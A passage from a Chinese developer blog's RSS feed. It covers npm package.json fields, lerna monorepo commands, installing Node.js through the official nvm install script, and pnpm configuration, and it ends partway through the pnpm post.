<p>假设这个 <code>host</code> 遵守 <code>semver</code> 规范, 只改变这个 <code>package</code> 的主版本会打破你的插件。因此, 如果你在 <code>package</code> 中用过每个 <code>1.x 版本</code> , 就用 <code>&quot;^1.0&quot;</code> 或者 &quot; <code>1.x&quot;</code> 来表示。如果你依赖于功能介绍 <code>1.5.2</code> , 用 <code>&quot;&gt;= 1.5.2 &lt; 2&quot;</code> 。</p>
<h3 id="bundleddependencies" tabindex="-1"> bundledDependencies</h3>
<div><p>作用</p>
<p>一组包名, 他们会在发布的时候被打包进去。<br> 拼成 <code>&quot;bundleDependencies&quot;</code> （缺 d）也可以: <code>optionalDependencies</code> 。</p>
</div>
<p>如果一个依赖可用, 但你希望在它安装错误的时候 <code>npm</code> 也能继续初始化, 那么你可以把它放在 <code>optionalDependencies hash</code> 中。这是一个包名到版本或者 <code>url</code> 的 <code>map</code> , 就像 <code>dependencies hash</code> 一样。只是它运行错误。</p>
<p>处理缺乏依赖也是你的程序的责任。比如像这样:</p>
<div><pre><code><span>try</span> <span>{</span>
  <span>var</span> foo <span>=</span> <span>require</span><span>(</span><span>"foo"</span><span>)</span><span>;</span>
  <span>var</span> fooVersion <span>=</span> <span>require</span><span>(</span><span>"foo/package.json"</span><span>)</span><span>.</span>version<span>;</span>
<span>}</span> <span>catch</span> <span>(</span>er<span>)</span> <span>{</span>
  foo <span>=</span> <span>null</span><span>;</span>
<span>}</span>
<span>if</span> <span>(</span><span>notGoodFooVersion</span><span>(</span>fooVersion<span>)</span><span>)</span> <span>{</span>
  foo <span>=</span> <span>null</span><span>;</span>
<span>}</span>

<span>// .. then later in your program ..</span>

<span>if</span> <span>(</span>foo<span>)</span> <span>{</span>
  foo<span>.</span><span>doFooThings</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>optionalDependencies</code> 会覆盖 <code>dependencies</code> 中同名的项, 所以通常比只放在一个地方好。</p>
<h3 id="engines" tabindex="-1"> engines</h3>
<p>你可以指定工作的 <code>node</code> 的版本:</p>
<div><pre><code><span>{</span>
  <span>"engines"</span><span>:</span> <span>{</span>
    <span>"node"</span><span>:</span> <span>">=0.10.3 &lt;0.12"</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><div><p>作用</p>
<p>像 <code>dependensies</code> 一样, 如果你不指定版本或者指定 <code>&quot;*&quot;</code> 作为版本, 那么所有版本的 <code>node</code> 都可以。</p>
</div>
<p>如果指定一个 <code>&quot;engines&quot;</code> 字段, 那么 <code>npm</code> 会需要 <code>node</code> 在里面, 如果 <code>&quot;engines&quot;</code> 被省略, <code>npm</code> 会假定它在 <code>node</code> 上工作。</p>
<p>你也可以用 <code>&quot;engines&quot;</code> 字段来指定哪一个 <code>npm</code> 版本能更好地初始化你的程序, 如:</p>
<div><pre><code><span>{</span>
  <span>"engines"</span><span>:</span> <span>{</span>
    <span>"npm"</span><span>:</span> <span>"~1.0.20"</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>记住, 除非用户设置 <code>engine-strict</code> 标记, 这个字段只是建议值。</p>
<h3 id="enginestrict" tabindex="-1"> engineStrict</h3>
<p>如果你确定你的模块一定不会运行在你指定版本之外的 <code>node</code> 或者 <code>npm</code> 上, 你可以在 <code>package.json</code> 文件中设置 <code>&quot;engineStrict&quot;:true</code> 。它会重写用户的 <code>engine-strict</code> 设置。</p>
<p>除非你非常非常确定, 否则不要这样做。如果你的 <code>engines hash</code> 过度地限制, 很可能轻易让自己陷入窘境。慎重地考虑这个选择。如果大家滥用它, 它会再以后的 <code>npm</code> 版本中被删除。</p>
<h3 id="os" tabindex="-1"> os</h3>
<p>你可以指定你的模块要运行在哪些操作系统中:</p>
<div><pre><code><span>{</span>
  <span>"os"</span><span>:</span> <span>[</span><span>"darwin"</span><span>,</span> <span>"linux"</span><span>]</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>你也可以用黑名单代替白名单, 在名字前面加上&quot;!&quot;就可以了:</p>
<div><pre><code><span>{</span>
  <span>"os"</span><span>:</span> <span>[</span><span>"!win32"</span><span>]</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>操作系统用 <code>process.platform</code> 来探测。虽然没有很好地理由, 但它是同时支持黑名单和白名单的。</p>
<h3 id="cpu" tabindex="-1"> cpu</h3>
<p>如果你的代码只能运行在特定的 <code>cpu</code> 架构下, 你可以指定一个:</p>
<div><pre><code><span>{</span>
  <span>"cpu"</span><span>:</span> <span>[</span><span>"x64"</span><span>,</span> <span>"ia32"</span><span>]</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>就像 <code>os</code> 选项, 你也可以黑一个架构:</p>
<div><pre><code><span>{</span>
  <span>"cpu"</span><span>:</span> <span>[</span><span>"!arm"</span><span>,</span> <span>"!mips"</span><span>]</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p><code>cpu</code> 架构用 <code>process.arch</code> 探测。</p>
<h3 id="preferglobal" tabindex="-1"> preferGlobal</h3>
<p>如果包主要是需要全局安装的命令行程序, 就设置它为 <code>true</code> 来提供一个 <code>warning</code> 给只在局部安装的人。<br> 它不会真正的防止用户在局部安装, 但如果它没有按预期工作它会帮助防止产生误会。</p>
<h3 id="private" tabindex="-1"> private</h3>
<p>如果你设置 <code>&quot;private&quot;: true</code> , <code>npm</code> 就不会发布它。<br> 这是一个防止意外发布私有库的方式。如果你要确定给定的包是只发布在特定 <code>registry</code> （如内部 <code>registry</code> ）的, 用 <code>publishConfighash</code> 的描述来重写 <code>registry</code> 的 <code>publish-time</code> 配置参数。</p>
<h3 id="publishconfig" tabindex="-1"> publishConfig</h3>
<div><p>作用</p>
<p>这是一个在 <code>publish-time</code> 使用的配置集合。当你想设置 <code>tag</code> 或者 <code>registry</code> 的时候它非常有用, 所以你可以确定一个给定的包没有打上 <code>&quot;lastest&quot;</code> 的 <code>tag</code> 或者被默认发布到全局的公开 <code>registry</code> 。</p>
</div>
<p>任何配置都可以被重写, 但当然可能只有 <code>&quot;tag&quot;</code> 和 <code>&quot;registry&quot;</code> 与发布的意图有关。</p>
<p>参见 <a href="http://npmjs.org/doc/misc/npm-config.html" target="_blank" rel="noopener noreferrer">npm-config</a> 有可以被重写的列表。</p>
<h3 id="see-also" tabindex="-1"> SEE ALSO</h3>
<ul>
<li>semver</li>
<li>npm-init</li>
<li>npm-version</li>
<li>npm-config</li>
<li>npm-config</li>
<li>npm-help</li>
<li>npm-faq</li>
<li>npm-install</li>
<li>npm-publish</li>
<li>npm-rm</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>lerna 的使用指南</title>
      <link>https://vxhly.github.io/views/nodejs/usage-lerna.html</link>
      <guid>https://vxhly.github.io/views/nodejs/usage-lerna.html</guid>
      <source url="https://vxhly.github.io/rss.xml">lerna 的使用指南</source>
      <description>前言
从 GitHub 上找到了比较多的仓库开始采用 lerna 来管理仓库的多包依赖, 也逐渐发现 lerna 的管理模式确实比较好, so 现贴上我的填坑笔记。

</description>
      <category>nodejs</category>
      <pubDate>Sun, 25 Oct 2020 14:49:11 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>从 GitHub 上找到了比较多的仓库开始采用 lerna 来管理仓库的多包依赖, 也逐渐发现 lerna 的管理模式确实比较好, so 现贴上我的填坑笔记。</p>
</div>

<h2 id="参考资料" tabindex="-1"> 参考资料</h2>
<p>先贴上我的参考资料来源</p>
<ol>
<li>lerna 官网: <a href="https://lerna.js.org/" target="_blank" rel="noopener noreferrer">lerna.js.org/</a></li>
<li>lerna 仓库：<a href="https://github.com/lerna/lerna/" target="_blank" rel="noopener noreferrer">github.com/lerna/lerna/</a></li>
</ol>
<p>当然也得感谢前人栽的树</p>
<ol>
<li><a href="https://www.jianshu.com/p/8b7e6025354b" target="_blank" rel="noopener noreferrer">lerna 的基础使用</a></li>
<li><a href="https://www.jianshu.com/p/63ec67445b0f" target="_blank" rel="noopener noreferrer">lerna 入门篇</a></li>
</ol>
<h2 id="什么是-lernajs" tabindex="-1"> 什么是 lernaJs</h2>
<p>lernaJs 是由 Babel 团队出的一个多包管理工具, 是 GitHub 上面开源的一款 js 代码库管理软件, 用来对一系列相互耦合比较大、又相互独立的 js git 库进行管理。因为 Babel 包含很多子包, 以前都是放在多个仓库里的, 管理比较困难, 特别是有调用系统内包的时候, 发布比较麻烦。所以为了能更好更快的跨包管理, babel 推出了 lernaJs, 使用了 monorepo 的概念, 现在 React, Babel, Angular, Jest 都在使用这个工具来管理包。</p>
<p>对于一些功能比较全的库, 我们往往会把各个小功能拆分成独立的 npm 库, 他们直接有比较强的依赖关系。可以解决各个库之间修改混乱、难以跟踪的问题。lerna 可以优化这种情形下的工作流。</p>
<p>简单的说, lernaJs 是用于管理具有多个包的 JavaScript 的项目工具。(官网原话为：<code>Lerna is a tool that optimizes the workflow around managing multi-package repositories with git and npm.</code>)</p>
<p>引入 lerna 后, 我们可以解决以下这些问题</p>
<ol>
<li>自动解决 packages 之间的依赖关系</li>
<li>通过 <code>git</code> 检测文件改动, 自动发布</li>
<li>根据 <code>git</code> 提交记录, 自动生成 <code>CHANGELOG</code></li>
</ol>
<h3 id="代码库结构" tabindex="-1"> 代码库结构</h3>
<p>lerna 管理的库文件结构类似如下这样</p>
<div><pre><code>my-lerna-repo
  |
  |- packages
  |    |
  |    |- package-1
  |    |    |
  |    |    └─ package.json
  |    |
  |    └─ package-2
  |         |
  |         └─ package.json
  |
  |- package.json
  |
  └─ lerna.json
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="lerna-主要做了什么" tabindex="-1"> lerna 主要做了什么</h3>
<ol>
<li>通过 lerna 的命令 <code>lerna bootstrap</code> 将会把代码库进行 link。</li>
<li>通过 <code>lerna publish</code> 发布最新改动的库</li>
</ol>
<h2 id="lerna-如何工作的" tabindex="-1"> lerna 如何工作的</h2>
<p>默认 lerna 有两种管理模式, 固定模式和独立模式</p>
<h3 id="固定模式" tabindex="-1"> 固定模式</h3>
<p>固定模式, 通过 lerna.json 的版本进行版本管理。当你执行 <code>lerna publish</code> 命令时, 如果距离上次发布只修改了一个模块, 将会更新对应模块的版本到新的版本号, 然后你可以只发布修改的库。</p>
<p>这种模式也是 Babel 使用的方式。如果你希望所有的版本一起变更, 可以更新 minor 版本号, 这样会导致所有的模块都更新版本。</p>
<h3 id="独立模式" tabindex="-1"> 独立模式</h3>
<p>独立模式, init 的时候需要设置选项 <code>--independent</code> 。独立模式允许管理者对每个库单独改变版本号, 每次发布的时候, 你需要为每个改动的库指定版本号。这种情况下, <code>lerna.json</code> 的版本号不会变化了, 默认为 <code>independent</code> 。</p>
<h2 id="lerna-json-解析" tabindex="-1"> lerna.json 解析</h2>
<div><pre><code><span>{</span>
  <span>"version"</span><span>:</span> <span>"1.1.3"</span><span>,</span>
  <span>"npmClient"</span><span>:</span> <span>"npm"</span><span>,</span>
  <span>"command"</span><span>:</span> <span>{</span>
    <span>"publish"</span><span>:</span> <span>{</span>
      <span>"ignoreChanges"</span><span>:</span> <span>[</span><span>"ignored-file"</span><span>,</span> <span>"*.md"</span><span>]</span>
    <span>}</span><span>,</span>
    <span>"bootstrap"</span><span>:</span> <span>{</span>
      <span>"ignore"</span><span>:</span> <span>"component-*"</span><span>,</span>
      <span>"npmClientArgs"</span><span>:</span> <span>[</span><span>"--no-package-lock"</span><span>]</span>
    <span>}</span>
  <span>}</span><span>,</span>
  <span>"packages"</span><span>:</span> <span>[</span><span>"packages/*"</span><span>]</span><span>,</span>
  <span>"useWorkspaces"</span><span>:</span> <span>false</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><ul>
<li><code>version</code> , 当前库的版本</li>
<li><code>npmClient</code> , 允许指定命令使用的 client, 默认是 npm, 可以设置成 yarn</li>
<li><code>command.publish.ignoreChanges</code> , 可以指定那些目录或者文件的变更不会被 publish</li>
<li><code>command.bootstrap.ignore</code> , 指定不受 bootstrap 命令影响的包</li>
<li><code>command.bootstrap.npmClientArgs</code> , 指定默认传给 <code>lerna bootstrap</code> 命令的参数</li>
<li><code>command.bootstrap.scope</code> , 指定那些包会受 <code>lerna bootstrap</code> 命令影响</li>
<li><code>packages</code> , 指定包所在的目录</li>
<li><code>useWorkspaces</code> , 支持使用 yarn workspaces</li>
</ul>
<h2 id="相关命令" tabindex="-1"> 相关命令</h2>
<h3 id="安装和初始化-lerna-项目" tabindex="-1"> 安装和初始化 lerna 项目</h3>
<p>安装 lernajs</p>
<div><pre><code><span>npm</span> <span>install</span> lerna -g
</code></pre><div aria-hidden="true"><div></div></div></div><p>初始化 lernaJs 项目</p>
<div><pre><code>lerna init
</code></pre><div aria-hidden="true"><div></div></div></div><p>复制代码执行后, 会自动生成一个由 lerna 管理的 monorepo。</p>
<p>其文件结构如下：</p>
<div><pre><code>lerna-repo/
  packages/          // 子包都放在这个目录中
  package.json
  lerna.json         // lerna js的配置文件
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><h3 id="添加子包" tabindex="-1"> 添加子包</h3>
<p>环境初始好以后, 首先需要添加一个子包, 添加子包的命令如下</p>
<div><pre><code>lerna create <span>&lt;</span>pkgName<span>></span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>执行这个命令后, 会问一些包名啊, 版本等问题和执行 npm init 后问的差不多, 填完这些问题后包就会自动创建一个子包。子包默认的目录结构如下</p>
<h3 id="为子包单独安装依赖" tabindex="-1"> 为子包单独安装依赖</h3>
<div><pre><code>lerna <span>add</span> <span>&lt;</span>packageName<span><span>2</span>></span> --scope <span>&lt;</span>packageName<span><span>1</span>></span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>如果你的仓库里的子包需要互相依赖也可用以上命令来安装</p>
<p>例如：子包 1 为 '@demo/packageName1', 子包 2 为 '@demo/packageName2', 要为子包 1 安装子包 2 的依赖, 你可以这样做, 注意要在项目的根目录执行以下命令</p>
<div><pre><code>lerna <span>add</span> @demo/packageName2 --scope @demo/packageName1
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="为仓库安装依赖" tabindex="-1"> 为仓库安装依赖</h3>
<div><pre><code>lerna bootstrap
</code></pre><div aria-hidden="true"><div></div></div></div><p>以上命令可以为仓库安装所有子包的依赖</p>
<h3 id="发布和更新-package" tabindex="-1"> 发布和更新 package</h3>
<div><pre><code>lerna publish
</code></pre><div aria-hidden="true"><div></div></div></div><p>发布当前项目他创建一个新的 release, 生成新的版本, 执行 <code>git commit/tag</code> 并发布到 npm</p>
<p>发布项目里的每个模块执行 <code>lerna updated</code> 确定是否需要发布假如需要发布 给 lerna.json 版本号做自增更新 package.json 里的版本号至最新为新版本更新 dependencies 为新版本创建一个 git commit 和 tag 发布更新项目到 npm 一次发布所有 packages, 删除 <code>lerna-temp</code> <code>tags</code> 和增加 tags 到 latest 通过在 package.json 中标记 <code>&quot;private&quot;: true</code> , 将使该包不发布</p>
<div><p>注意</p>
<p>以@开头包的发布问题</p>
</div>
<p>发布 package 的名字如果是以@开头的, 例如 @feu/tools, npm 默认以为是私人发布, 需要使用 <code>npm publish --access public</code> 发布。但是 <code>lerna publish</code> 不支持该参数, 解决方法参考: <a href="https://github.com/lerna/lerna/issues/914" target="_blank" rel="noopener noreferrer">issues</a></p>
<p>方案参考:</p>
<div><pre><code><span>// package.json</span>
<span>{</span>
  <span>"name"</span><span>:</span> <span>"@feu/tools"</span><span>,</span>
  <span>"publishConfig"</span><span>:</span> <span>{</span>
    <span>"access"</span><span>:</span> <span>"public"</span> <span>// 如果该模块需要发布, 对于scope模块, 需要设置为publish, 否则需要权限验证</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="options" tabindex="-1"> options</h4>
<h5 id="canary" tabindex="-1"> canary</h5>
<div><p>提示</p>
<p>可以用来独立发布每个 commit, 不打 tag</p>
</div>
<div><pre><code>lerna publish --canary
<span># 1.0.0 => 1.0.1-alpha.0+${SHA} of packages changed since the previous commit</span>
<span># a subsequent canary publish will yield 1.0.1-alpha.1+${SHA}, etc</span>

lerna publish --canary --preid beta
<span># 1.0.0 => 1.0.1-beta.0+${SHA}</span>

<span># The following are equivalent:</span>
lerna publish --canary minor
lerna publish --canary preminor
<span># 1.0.0 => 1.1.0-alpha.0+${SHA}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="删除子包中的依赖项" tabindex="-1"> 删除子包中的依赖项</h3>
<div><pre><code>lerna clean
</code></pre><div aria-hidden="true"><div></div></div></div><p>从所有软件包中删除 <code>node_modules</code> 目录。 <code>lerna clean</code> 尊重 <code>--ignore</code> 和 <code>--scope</code> 标志（请参阅标志）。</p>
]]></content:encoded>
    </item>
    <item>
      <title>使用 nvm 安装 Node.js</title>
      <link>https://vxhly.github.io/views/nodejs/usage-nvm-to-install-node-js.html</link>
      <guid>https://vxhly.github.io/views/nodejs/usage-nvm-to-install-node-js.html</guid>
      <source url="https://vxhly.github.io/rss.xml">使用 nvm 安装 Node.js</source>
      <description>前言
安装 Node.js 的最佳方式是使用 nvm。nvm 最开始是在 Mac OS 下开发的, 所以 Mac OS 下同样使用 nvm 安装 Node.js。

</description>
      <category>nodejs</category>
      <pubDate>Sun, 31 Jul 2016 15:11:44 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>安装 Node.js 的最佳方式是使用 nvm。nvm 最开始是在 <code>Mac OS</code> 下开发的, 所以 <code>Mac OS</code> 下同样使用 nvm 安装 Node.js。</p>
</div>

<h2 id="下载-nvm" tabindex="-1"> 下载 nvm</h2>
<h3 id="通过-curl-下载-需要安装-curl" tabindex="-1"> 通过 curl 下载（需要安装 curl）</h3>
<div><pre><code><span>apt-get</span> <span>install</span> <span>curl</span>
<span>curl</span> -o- https://raw.githubusercontent.com/creationix/nvm/v0.33.11/install.sh <span>|</span> <span>bash</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="通过-wget-下载-liunx-下载命令" tabindex="-1"> 通过 wget 下载（liunx 下载命令）</h3>
<div><pre><code><span>wget</span> -qO- https://raw.githubusercontent.com/creationix/nvm/v0.33.2/install.sh <span>|</span> <span>bash</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="重启终端-安装-node-js" tabindex="-1"> 重启终端, 安装 Node.js</h2>
<div><pre><code>nvm <span>install</span> <span>&lt;</span>version<span>></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="设定-node-js-的默认版本" tabindex="-1"> 设定 Node.js 的默认版本</h3>
<div><pre><code>nvm <span>alias</span> defaults <span>&lt;</span>version<span>></span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="查看-node-js-和-npm-版本号" tabindex="-1"> 查看 Node.js 和 npm 版本号</h3>
<div><pre><code><span>node</span> -v
<span>npm</span> -v
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h2 id="npm-淘宝换源" tabindex="-1"> npm 淘宝换源</h2>
<div><p>提示</p>
<p>npm 加载的模块, 多数是国外源的, 所以很容易被墙, 解决办法, 除了翻墙, 还有就是 npm 换源, 使用国内源, 但是本人还是推介使用国外源, 因为国外源较国内源稳定、全面。</p>
</div>
<div><pre><code><span>npm</span> <span>install</span> -g cnpm --registry<span>=</span>//registry.npm.taobao.org
</code></pre><div aria-hidden="true"><div></div></div></div><p>使用 cnpm 安装模块</p>
<div><pre><code>cnpm <span>install</span> <span>[</span>name<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>使用 pnpm 释放你的磁盘空间</title>
      <link>https://vxhly.github.io/views/nodejs/usage-pnpm.html</link>
      <guid>https://vxhly.github.io/views/nodejs/usage-pnpm.html</guid>
      <source url="https://vxhly.github.io/rss.xml">使用 pnpm 释放你的磁盘空间</source>
      <description>前言
主要介绍 pnpm 的使用, 以及如何使用 pnpm 解决 node 依赖包庞大的问题。pnpm 依赖于 Node.js, 童鞋们要注意你的系统是否有 Node.js 环境。

</description>
      <category>nodejs</category>
      <pubDate>Wed, 19 Aug 2020 14:14:13 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>主要介绍 pnpm 的使用, 以及如何使用 pnpm 解决 node 依赖包庞大的问题。pnpm 依赖于 Node.js, 童鞋们要注意你的系统是否有 Node.js 环境。</p>
</div>

<h2 id="pnpm-是什么" tabindex="-1"> pnpm 是什么</h2>
<p>先上官方的文档 <a href="https://pnpm.js.org/en/" target="_blank" rel="noopener noreferrer">pnpm 的官方文档</a></p>
<div><p>简介</p>
<p>官方文档中有这么一句：</p>
<p>pnpm uses a content-addressable filesystem to store all files from all module directories on a disk.</p>
<p>中文翻译过来的大概意思是：</p>
<p>pnpm 使用内容可寻址文件系统将磁盘上所有模块目录中的所有文件存储在磁盘上。</p>
</div>
<p>简单的说</p>
<p>pnpm 是一个更为高效的 node.js 的包管理器, 类似于 npm 和 yarn。pnpm 结合了 npm 和 yarn 的优点, 它会在本地进行缓存依赖项, 加快了下载速度</p>
<p>pnpm 的原理是会为当前项目下的依赖项在当前磁盘下创建一份 store, 这个 store 存放的信息为依赖项的版本号信息, 用于 pnpm 二次下载时进行陈旧版本检测使用的</p>
<p>pnpm 还会为当前项目的 node_modules 下创建一个 .pnpm 的一个依赖项存储位置, 在其他依赖项中如果引用了相同的依赖项它会采用硬链接的形式链接到这个位置</p>
<p>这里寻找到 pnpm 的缺点是：</p>
<ul>
<li>pnpm 在每次 install 的时候, 都会去检测陈旧依赖项的版本号信息, 如果项目的依赖项版本号并未进行更新的话, 这一过程无非是比较耗时的</li>
<li>不得与 npm 和 yarn 进行混用, 例如使用了 pnpm 安装了一个依赖项, 在使用 npm 或 yarn 进行安装依赖项时并不会将依赖项安装到指定的目录下, 这就违背了 pnpm 的设计初衷</li>
<li>虽然不得与 npm 和 yarn 进行混用, 但是仍然可以使用 npm 或者 yarn 执行项目配置的命令, 这个并不会受到影响</li>
</ul>
<p>以上的这些缺点, 我们可以通过对 pnpm 的简单的配置规避掉上方的问题</p>
<h2 id="npm-与-yarn-与-pnpm-的比较" tabindex="-1"> npm 与 yarn 与 pnpm 的比较</h2>
<h3 id="npm" tabindex="-1"> npm</h3>
<p>1）同步下载：安装多个包时会使用从事件队列中读取事件的同步下载模式进行安装依赖；</p>
<p>2）本地缓存：npm 会在安装依赖后产生本地缓存, 加快再次重新安装时的下载速度；</p>
<p>3）层级关系复杂：npm 在安装多个依赖包时, 会先遍历各个依赖包, 生成这些包关系树, 这也是 npm 安装时时间慢的一大主要原因；</p>
<p>4）不稳定, 抛出错误不明显：当某个安装包版本变更后, 在终端编译时会造成抛出错误, 这也是有时候同一份代码你能用别人用不了的原因, 更致命的是, 安装依赖出错时, 抛出错误后并不会停止执行后面的事件, 因此, 如果后面的安装包依赖于出错的安装包, 会报出一堆错误, 你甚至无法得知究竟是哪个包出了问题, 因此大部分时间都是整个删除整个重装 node_modules;</p>
<ol start="5">
<li>在 npm5 中, 官方解决了因为版本不一致造成崩溃的问题, 但是需要用户手动执行 npm shrinkwrap 命令, 从而生成一个 package-lock.json 文件, 该文件包含了包的具体信息和版本等内容, 在安装时会首先进行检测, 安装对应版本。</li>
</ol>
<p>6）在线安装：需要用到互联网</p>
<h3 id="yarn" tabindex="-1"> yarn</h3>
<ol>
<li>异步下载：多个安装包同时下载, 解决下载慢的问题；</li>
</ol>
<p>2）本地缓存：同 npm 一样, 会进行本地缓存, 再次下载先从本地获取</p>
<p>3）简化命令：对比 npm, 命令更加简短, 语义更加明确</p>
<p>4）包依赖关系扁平化：npm 会按依赖层级来读取底层包名称, 当层级够深时, windows 下会造成调用数量超限的报错, 而 yarn 则直接取到底层包名称。</p>
<p>5）指定版本安装, 更加稳定：npm 的稳定性一直是一个问题, yarn 解决了这个问题：在使用 yarn 安装时, 会自动生成一个叫做 yarn.lock 的文件, 该文件包含了当前依赖包的版本信息和对应的校验规则, 在安装新的包之后, 会自动更新, 解决了版本库不对应造成的编译错误。</p>
<p>6）提供离线模式：即使没有互联网依旧可以使用</p>
<h3 id="pnpm" tabindex="-1"> pnpm</h3>
<ol>
<li>运行速度超过 npm 和 yarn</li>
</ol>
<p>2）采用硬链接和符号链接避免复制本地缓存源文件, 解决了 yarn 的一大弱点</p>
<ol start="3">
<li>
<p>提供离线模式：即使没有互联网依旧可以使用</p>
</li>
<li>
<p>异步下载：多个安装包同时下载, 解决下载慢的问题；</p>
</li>
</ol>
<h2 id="pnpm-的简单使用" tabindex="-1"> pnpm 的简单使用</h2>
<p>首先我们先全局安装 pnpm</p>
<div><pre><code><span>npm</span> i -g <span>pnpm</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>pnpm 的一些命令与 npm 的都大同小异, 下方例举几个常用的命令, 具体的不做过多的阐述</p>
<h3 id="install" tabindex="-1"> install</h3>
<p>安装项目的依赖项</p>
<div><pre><code>$ <span>pnpm</span> <span>install</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="update" tabindex="-1"> update</h3>
<p>更新项目的依赖项</p>
<div><pre><code>$ <span>pnpm</span> update
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="add" tabindex="-1"> add</h3>
<p>安装项目的某一个依赖项</p>
<div><pre><code>$ <span>pnpm</span> <span>add</span> lodash
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="store" tabindex="-1"> store</h3>
<p>向本地的存储中安装一个依赖包</p>
<div><pre><code>$ <span>pnpm</span> store <span>add</span> lodash
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="npmrc-文件解析" tabindex="-1"> .npmrc 文件解析</h2>
<p>使用过 node 的同学都知道, npm 会在全局创建一个 .npmrc 文件, 这个文件通常用于存放 npm 的相关配置信息, 例如 npm 的下载软件源</p>
<div><pre><code>registry=https://registry.npm.taobao.org/
</code></pre><div aria-hidden="true"><div></div></div></div><p>在 pnpm 中提供了几个配置项, 而这几个配置项正是 node 工程下实现多个项目共用 node_modules 的核心重点（pnpm 的 .npmrc 的具体官方说明：pnpm 中.npmrc 的配置项）下面例举可能会使用到的配置项</p>
<h3 id="virtual-store-dir" tabindex="-1"> virtual-store-dir</h3>
<p>这个配置项的作用是用于存放工程依赖项的实际链接位置, 也是依赖包的缓存目录, 默认值为 node_modules/.pnpm, 即为当前工程下的 node_modules/.pnpm</p>
<p>上原文的解释</p>
<div><p>原文</p>
<p>Added in: v4.1.0</p>
<ul>
<li>Default: <em>node_modules/.pnpm</em></li>
<li>Types: <em>path</em></li>
</ul>
<p>The directory with links to the store. All direct and indirect dependencies of the project are linked into this directory.</p>
<p>This is a useful setting that can solve issues with long paths on Windows. If you have some dependencies with very long paths, you can select a virtual store in the root of your drive (for instance <code>C:\my-project-store</code> ).</p>
<p>Or you can set the virtual store to <code>.pnpm</code> and add it to <code>.gitignore</code> . This will make the stacktraces nicer as paths to dependencies will have one directory less.</p>
<p><em>NOTE</em>: the virtual store cannot be shared between several projects. Every project should have its own virtual store.</p>
</div>
<h3 id="store-dir" tabindex="-1"> store-dir</h3>
<p>这个配置项的作用是存放所有依赖项的的所有版本号信息, 用于 pnpm 进行陈旧性检测, 默认值为 ~/.pnpm-store（在 linux 下指向的是用户目录 ~, 在 Windows 下指向的是当前的磁盘根目录）</p>
<p>上原文的解释</p>
<div><p>原文</p>
<p>Added in: v4.2.0 (renamed from store)</p>
<ul>
<li>Default: <em>~/.pnpm-store</em></li>
<li>Type: <em>path</em></li>
</ul>
<p>The location where all the packages are saved on the disk.</p>
<p>The store should be always on the same disk on which installation is happening. So there will be one store per disk. If there is a home directory on the current disk, then the store is created in <code>&lt;home dir&gt;/.pnpm-store</code> . If there is no homedir on the disk, then the store is created in the root. For example, if installation is happening on disk D then the store will be created in <code>D:\.pnpm-store</code> .</p>
<p>It is possible to set a store from a different disk but in that case pnpm will copy, not link, packages from the store. Hard links are possible only inside a filesystem.</p>
</div>
<h3 id="package-import-method" tabindex="-1"> package-import-method</h3>
<p>这个配置项的作用是用于指定依赖包导入的方式, 默认值为 auto, 会自动判断是否需要从网上的源进行下载操作</p>
<p>上原文的解释</p>
<div><p>原文</p>
<p>Added in: v1.25.0</p>
<ul>
<li>Default: <em>auto</em></li>
<li>Type: <em>auto</em>, <em>hardlink</em>, <em>copy</em>, <em>clone</em></li>
</ul>
<p>Controls the way packages are imported from the store.</p>
<p><em>auto</em> - try to clone packages from the store. If cloning is not supported then hardlink packages from the store. If neither cloning nor linking is possible, falls back to copying <em>hardlink</em> - hardlink packages from the store <em>copy</em> - copy packages from the store <em>clone</em> - clone (aka copy-on-write or reflink) packages from the store</p>
</div>
<h3 id="shamefully-hoist" tabindex="-1"> shamefully-hoist</h3>
<p>这个配置项允许我们在安装依赖项时, 默认值为 false, node_modules 目录像 npm 的一样, 因为 pnpm 默认生成的 node_modules 是属于半严格的树形结构</p>
<p>上原文的解释</p>
<div><p>原文</p>
<p>Added in: v1.34.0 (Renamed from <code>shamefully-flatten</code> in v4.0.0)</p>
<ul>
<li>Default: <em>false</em></li>
<li>Type: <em>Boolean</em></li>
</ul>
